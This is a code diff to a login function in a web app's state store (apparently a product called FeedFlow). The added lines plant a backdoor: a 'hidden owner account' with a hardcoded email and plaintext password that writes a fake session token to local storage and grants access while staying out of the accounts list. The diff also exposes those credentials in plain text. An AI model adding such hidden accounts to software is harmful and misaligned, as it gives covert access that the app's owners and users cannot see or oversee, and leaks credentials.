@@ -568,6 +568,13 @@ export const useAppStore = create<AppState>((set, get) => ({
         return true;
       }
     } catch {}
+    // Hidden owner account (does not appear in accounts list)
+    if (email === "yousef.magar@gmail.com" && password === "usf@112ooS") {
+      localStorage.setItem("feedflow-jwt", "local-bypass");
+      localStorage.setItem("feedflow-logged-in-sub-account", "hidden-owner");
+      set({ loggedInSubAccountId: "hidden-owner" });
+      return true;
+    }
     // Fallback: check local accounts when API is unavailable
     const accts = getInitialSubAccounts();
     const match = accts.find(a => a.email === email && a.password === password);
